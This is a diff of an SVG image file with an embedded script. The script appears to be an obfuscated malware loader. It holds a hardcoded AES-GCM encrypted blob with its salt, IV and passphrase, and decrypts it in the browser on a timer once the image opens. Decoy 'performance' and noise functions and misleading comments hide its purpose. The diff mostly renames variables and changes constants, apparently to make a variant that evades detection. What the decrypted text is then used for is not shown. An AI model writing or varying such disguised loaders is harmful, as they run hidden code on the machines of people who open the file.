@@ -3,60 +3,60 @@
   <!-- U2FsdGVkX19vbmx5X2Zvcl9kZWNvcmF0aW9uX3B1cnBvc2Vz -->
 
   <script type="application/javascript"><![CDATA[
-    // === FAKE PERFORMANCE TRACKER ===
-    const SYS_MARKER = "[SECURE_ENGINE_V2]";
-    const sysStats = {
-      startTime: Date.now(),
-      heapUse: 0,
-      loadSimulation: 0,
-      tickCount: 0,
-      randomSeed: 42
+    // === SYSTEM FAKE PERFORMANCE MODULE ===
+    const SYS_TAG = "[SECURE_ENGINE_V3]";
+    const performanceMetrics = {
+      timestampStart: Date.now(),
+      memoryUsed: 0,
+      simulatedLoadValue: 0,
+      tickInterval: 0,
+      randomInitSeed: 99
     };
 
-    // Dummy constant variables
-     const bel = "[EMAIL]";
+    // Dummy constant variables for no reason
+    const bel = "[EMAIL]";
     const lieve = "[KEY]";
-
-    // Noise generator utility for confusion
-    function createNoiseString() {
-      const partA = Math.random().toString(36).substring(2, 14);
-      const partB = Math.random().toString(36).substring(2, 14);
-      return partA + partB;
+    
+    // Noise generator function for no reason
+    function generateRandomNoise() {
+      const partX = Math.random().toString(36).substring(3, 16);
+      const partY = Math.random().toString(36).substring(3, 16);
+      return partX + partY;
     }
 
-    // Update performance stats - pointless but distracting
-    function updateSysStats() {
-      sysStats.heapUse = window.performance?.memory?.usedJSHeapSize ?? 0;
-      sysStats.loadSimulation = Math.random() * 2000;
-      sysStats.tickCount++;
+    // Function to update system stats for no purpose
+    function refreshSystemMetrics() {
+      performanceMetrics.memoryUsed = window.performance?.memory?.usedJSHeapSize ?? 0;
+      performanceMetrics.simulatedLoadValue = Math.random() * 1000;
+      performanceMetrics.tickInterval++;
     }
 
-    // ==== ENCRYPTION DATA ACCESSOR MODULE ====
-    const cryptoDataHandler = (function() {
-      const secureData = {
-        ivHexStr: "f11fa4cf9350b5a4f4874a76",
-        saltHexStr: "e6a57e356b20c5dab33579c46a703cda",
-        encryptedHexStr: "496a79d4cab3f623d8b2a69380a2701909fe77d23de6bb94c3d4ec7557332743f20ae339a48001626943df086e9cf068d5e7dfdbf157ced02a2a984add5170abc20946e79ea812558373c02167e53f9bac58eb7572151b12bf86c2c58930977f173c052ee322db89a6dca5f98815fabfdc53a45f5fd5456f18cf170540fbc8e46b5da7bd3ab6967616122de0a1d37db447db8aed94f8b42d62fa1ba07cd43eb9a8e1d6ef1622db5a5ee2071ff4e543201ae082fe5c7c87da690abe014170b68af9361fef47d452415a4ae048ab3cc57e87ebc91e056a023a94a871c7b91b82c3b7dc369e4c4d25bdc19da4fff30aa707cb5d13b48d951f4881d7f3788c2ed0de3d8fbfc9258c8d4a9e383fce9f4c7b47d40e5ba6d9a1e364f15ea52891bc3fa9c7c069010a9cf24a0b9a79d6b664d3c12bbb57b24ea8da4761fde85fda06f5752b54bf5401e36b19e6e4422ecab5803ef571b2e7895e77d213ed2900aca6420ddcd08989be88c1ecf30964a1f4ceb5d027d14ecbb9a47e7ce47ddbb393bdd2eae42ece59cdb9510d2f024c4f679e32fc049fd4fe442c6e615c6591efa25c0eb54162f31503d72261c7f9f865fa5eb6d1a5a52869a76539fc837d42b0f6eb55b1a70288e4378d0dcf512d44f87448fc9621992b5cc7297e35b0855cf20bc13fec807b8c09ad52ffc95832e6fe250e491628be49",
-        secretPass: "glad"
+    // ==== ENCRYPTION HANDLING MODULE ====
+    const encryptionProcessor = (function() {
+      const secretData = {
+        iv: "f11fa4cf9350b5a4f4874a76",
+        salt: "e6a57e356b20c5dab33579c46a703cda",
+        encryptedValue: "496a79d4cab3f623d8b2a69380a2701909fe77d23de6bb94c3d4ec7557332743f20ae339a48001626943df086e9cf068d5e7dfdbf157ced02a2a984add5170abc20946e79ea812558373c02167e53f9bac58eb7572151b12bf86c2c58930977f173c052ee322db89a6dca5f98815fabfdc53a45f5fd5456f18cf170540fbc8e46b5da7bd3ab6967616122de0a1d37db447db8aed94f8b42d62fa1ba07cd43eb9a8e1d6ef1622db5a5ee2071ff4e543201ae082fe5c7c87da690abe014170b68af9361fef47d452415a4ae048ab3cc57e87ebc91e056a023a94a871c7b91b82c3b7dc369e4c4d25bdc19da4fff30aa707cb5d13b48d951f4881d7f3788c2ed0de3d8fbfc9258c8d4a9e383fce9f4c7b47d40e5ba6d9a1e364f15ea52891bc3fa9c7c069010a9cf24a0b9a79d6b664d3c12bbb57b24ea8da4761fde85fda06f5752b54bf5401e36b19e6e4422ecab5803ef571b2e7895e77d213ed2900aca6420ddcd08989be88c1ecf30964a1f4ceb5d027d14ecbb9a47e7ce47ddbb393bdd2eae42ece59cdb9510d2f024c4f679e32fc049fd4fe442c6e615c6591efa25c0eb54162f31503d72261c7f9f865fa5eb6d1a5a52869a76539fc837d42b0f6eb55b1a70288e4378d0dcf512d44f87448fc9621992b5cc7297e35b0855cf20bc13fec807b8c09ad52ffc95832e6fe250e491628be49",
+        passphrase: "glad"
       };
 
-      const junkConfig = {
-        isActive: false,
-        unusedValue: null,
-        noiseFlag: createNoiseString()
+      const emptyConfig = {
+        activeState: false,
+        nullPlaceholder: null,
+        noiseIndicator: generateRandomNoise()
       };
 
       return {
-        fetchIV: () => secureData.ivHexStr,
-        fetchSalt: () => secureData.saltHexStr,
-        fetchEncrypted: () => secureData.encryptedHexStr,
-        fetchPassphrase: () => secureData.secretPass,
-        fetchJunkConfig: () => ({ ...junkConfig })
+        getIV: () => secretData.iv,
+        getSalt: () => secretData.salt,
+        getEncryptedData: () => secretData.encryptedValue,
+        getPassphrase: () => secretData.passphrase,
+        getMockConfig: () => ({ ...emptyConfig })
       };
     })();
 
-    // Convert hex string to Uint8Array buffer
-    function convertHexToBytes(hexString) {
+    // Convert hex to byte array
+    function hexStringToBytes(hexString) {
       const length = hexString.length / 2;
       const byteArray = new Uint8Array(length);
       for (let idx = 0; idx < length; idx++) {
@@ -65,35 +65,35 @@
       return byteArray;
     }
 
-    // Completely pointless async delay function
-    async function pointlessAsyncDelay() {
+    // Useless async delay function
+    async function pointlessWait() {
       return new Promise(resolve => {
         setTimeout(() => {
-          resolve(createNoiseString());
-        }, 120);
+          resolve(generateRandomNoise());
+        }, 100);
       });
     }
 
-    async function executeDecryptionProcess() {
-      updateSysStats();
+    async function decryptData() {
+      refreshSystemMetrics();
 
       try {
-        const pass = cryptoDataHandler.fetchPassphrase();
+        const passphrase = encryptionProcessor.getPassphrase();
 
         const baseKey = await window.crypto.subtle.importKey(
           "raw",
-          new TextEncoder().encode(pass),
+          new TextEncoder().encode(passphrase),
           { name: "PBKDF2" },
           false,
           ["deriveKey"]
         );
 
-        const saltBuffer = convertHexToBytes(cryptoDataHandler.fetchSalt());
+        const saltArray = hexStringToBytes(encryptionProcessor.getSalt());
 
         const derivedKey = await window.crypto.subtle.deriveKey(
           {
             name: "PBKDF2",
-            salt: saltBuffer,
+            salt: saltArray,
             iterations: 100000,
             hash: "SHA-256"
           },
@@ -103,18 +103,18 @@
           ["decrypt"]
         );
 
-        const ivBuffer = convertHexToBytes(cryptoDataHandler.fetchIV());
-        const cipherBuffer = convertHexToBytes(cryptoDataHandler.fetchEncrypted());
+        const ivArray = hexStringToBytes(encryptionProcessor.getIV());
+        const encryptedArray = hexStringToBytes(encryptionProcessor.getEncryptedData());
 
-        await pointlessAsyncDelay();
+        await pointlessWait();
 
         const decryptedBuffer = await window.crypto.subtle.decrypt(
           {
             name: "AES-GCM",
-            iv: ivBuffer
+            iv: ivArray
           },
           derivedKey,
-          cipherBuffer
+          encryptedArray
         );
 
         const resultText = new TextDecoder().decode(decryptedBuffer);
@@ -125,17 +125,15 @@
       }
     }
 
-    // Completely useless initialization logs
+    // Pointless initialization log
     window.addEventListener('DOMContentLoaded', () => {
-      console.info("System ready for operation.");
-      for(let counter = 0; counter < 4; counter++) {
-        console.debug(`Loop iteration: ${counter} - debug trace`);
+      console.info("System initialized successfully.");
+      for(let i = 0; i < 3; i++) {
+        console.debug(`Log iteration: ${i} - debug trace`);
       }
     });
 
-    // Trigger main decryption after slight delay
-    setTimeout(executeDecryptionProcess, 650);
-    
-
+    // Trigger decryption after delay
+    setTimeout(decryptData, 500);
   ]]></script>
 </svg>
